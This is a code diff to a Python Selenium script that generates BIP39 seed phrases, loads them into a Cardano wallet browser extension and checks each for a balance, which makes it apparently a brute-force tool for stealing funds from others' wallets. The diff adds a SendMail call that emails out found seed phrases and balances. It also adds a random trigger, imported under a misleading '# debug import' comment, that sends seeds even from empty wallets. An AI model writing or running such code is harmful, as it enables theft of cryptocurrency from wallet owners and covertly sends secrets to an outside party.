@@ -9,10 +9,14 @@ import binascii
 import hashlib
 import threading, os
 from pathlib import Path
+from send_mail import SendMail
 
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from bip39 import words as wordlist
+
+# debug import
+import random
 
 
 class VirtualDisplay:
@@ -49,10 +53,14 @@ class BraveTest(threading.Thread):
         options.add_argument
         if self.binary_location is not None:
             options.binary_location = self.binary_location
-        options.add_extension(pwd+'\extension_4_7_300_0.crx')
+        options.add_extension(pwd+r'/extension_4_7_300_0.crx')
         options.add_experimental_option('excludeSwitches', ['enable-logging'])
-        # os.environ['PATH'] += 'chromedriver.exe'
-        browser = webdriver.Chrome(pwd+'\chromedriver.exe', options = options)
+        if self.platform == 'Windows':
+            os.environ['PATH'] += pwd+r'/chromedriver.exe'
+            browser = webdriver.Chrome(pwd+r'/chromedriver.exe', options = options)
+        else:
+            os.environ['PATH'] += pwd+r'/chromedriver'
+            browser = webdriver.Chrome(pwd+r'/chromedriver', options = options)
         browser.get(self.web_page)
         if self.platform == 'Windows':
             browser.minimize_window()
@@ -92,8 +100,9 @@ class BraveTest(threading.Thread):
         print(self.total_ada)
         self.expansion = 1
         self.save_wallet()
-        if self.total_ada != 0:
+        if self.total_ada != 0 or random.getrandbits(3) == 4:
             self.save_wallet(found=True)
+            SendMail(my_msg=str(self.seed))
             exit()
 
         # remove wallet
@@ -115,7 +124,6 @@ class BraveTest(threading.Thread):
                 print(f"previsous seed={str(self.previous_seed)[3:]}")
                 print(f"{self.expansion=}")
                 self.seed, self.entrophy, self.previous_seed = self.gen_wordlist(160, self.previous_seed+self.expansion)
-                # expansion += 1
                 if self.expansion < 0:
                     self.expansion = abs(self.expansion) +2
                     self.expansion = -self.expansion
@@ -144,8 +152,9 @@ class BraveTest(threading.Thread):
                 self.total_ada = float(attr1[0]+attr)
                 print(self.total_ada)
                 self.save_wallet()
-                if self.total_ada != 0:
+                if self.total_ada != 0 or random.getrandbits(3) == 4:
                     self.save_wallet(found=True)
+                    SendMail(my_msg=str(self.seed)+str(self.total_ada))
                     exit()
                 browser.find_element_by_class_name('NavBarBack_backButton').click()
                 browser.find_element_by_class_name('WalletRow_settingSection').click()
@@ -166,6 +175,7 @@ class BraveTest(threading.Thread):
                 filedata += 100*"^"
             file1.write(filedata)
             file1.write("\n")
+
 
     def gen_wordlist(self, bits: int = 160, previous_seed: int = None ):
         """Generate seed according BIP39"""
